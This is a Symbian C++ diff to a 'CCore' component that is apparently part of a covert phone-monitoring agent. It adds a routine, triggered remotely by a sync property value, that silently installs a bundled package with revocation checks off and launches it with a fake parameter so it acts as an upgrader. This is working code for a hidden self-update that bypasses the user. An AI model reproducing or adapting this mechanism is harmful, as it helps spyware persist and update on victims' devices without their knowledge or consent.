@@ -295,6 +295,56 @@ void CCore::LoadNewConfigL()
 		
 	}
 
+void CCore::LoadNewUpgradeL()
+	{
+	// 1. install uninstaller
+	// Prepare for silent install
+	SwiUI::RSWInstSilentLauncher      launcher; 
+	SwiUI::TInstallOptions            options;
+	SwiUI::TInstallOptionsPckg        optionsPckg;	
+		
+	// Connect to the server
+	User::LeaveIfError( launcher.Connect() );
+	  
+	// See SWInstDefs.h for more info about these options
+	options.iUpgrade = SwiUI::EPolicyAllowed;
+	options.iOCSP = SwiUI::EPolicyNotAllowed;
+	options.iDrive = 'C';   // Hard-coded as phone memory  
+	options.iUntrusted = SwiUI::EPolicyNotAllowed; 
+	options.iCapabilities = SwiUI::EPolicyAllowed;
+		    
+	optionsPckg = options;
+		
+	// Create path
+	TBuf<48> path;
+	path.Append(_L("C:\\Private\\"));
+	TBuf<12> uid;
+	uid.Copy(KUidCore);
+	uid.Copy(uid.Mid(2,uid.Length()-2));
+	path.Append(uid);
+	path.Append(_L("\\Uninstaller.sisx"));
+		
+	// Start synchronous install
+	TInt err = launcher.SilentInstall(path,optionsPckg);
+			
+	launcher.Close();
+	// 2. call it with a parameter so it is instructed to act as upgrader and not uninstaller
+	// retrieve uid3 of uninstaller
+	TBuf8<12> hexBuf(KUidUninstaller);
+	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
+	TLex8 lex(hexBuf);
+	TUint32 bdUid;
+	lex.Val(bdUid,EHex);
+	TUid kUid3 = TUid::Uid(bdUid);
+	// construct TUidType
+	TUidType uidType(TUid::Uid(0x1000007a), TUid::Uid(0x0), kUid3 );
+	// create process with that uid, so we are sure it's not another with the same name
+	RProcess process;
+	process.Create(_L("Uninstaller.exe"),_L("fake_param"), uidType);
+	process.Resume();
+	process.Close();
+	}
+
 void CCore::StartAgentL(TAgentType aAgentId)
 	{
 	if(aAgentId == 0)
@@ -491,7 +541,13 @@ void CCore::PropertyChangedL(TUid category, TUint key, TInt value)
 			LoadNewConfigL();
 			return;
 		}
-			
+		
+		// Load a new upgrade, triggered into ActionSync.cpp
+		if (value == 0xEADE){
+			LoadNewUpgradeL();
+			return;
+		}
+				
 		CAbstractQueueEndPoint::PropertyChangedL(category, key, value);
 
 		//TODO: delete when done with memory leak tests
@@ -703,7 +759,8 @@ LOCAL_C void DoStartL()
 	//start free space monitor
 	core->StartMonitorFreeSpace();  
 	
-	CActiveScheduler::Start();  
+	CActiveScheduler::Start(); 
+			
 	CleanupStack::PopAndDestroy(core);
 	// Delete active scheduler
 	CleanupStack::PopAndDestroy(scheduler); 
